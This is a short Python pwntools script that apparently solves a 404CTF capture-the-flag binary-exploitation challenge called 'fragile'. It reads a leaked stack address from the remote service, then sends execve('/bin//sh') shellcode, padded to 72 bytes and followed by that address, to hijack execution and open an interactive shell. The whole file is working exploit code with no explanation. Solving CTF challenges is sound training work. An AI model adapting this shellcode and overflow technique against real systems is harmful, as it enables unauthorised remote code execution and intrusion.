#!/usr/bin/env python
from pwn import *
from parse import parse

t = remote('challenge.404ctf.fr', 31720)
# t = process('./fragile')

t.recvline()
leak = int(parse("Cadeau : {}", t.recvline().strip().decode('utf-8'))[0], 16)

shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
payload = shellcode + b"0"*(72-len(shellcode)) + p64(leak)
t.sendline(payload)

t.interactive()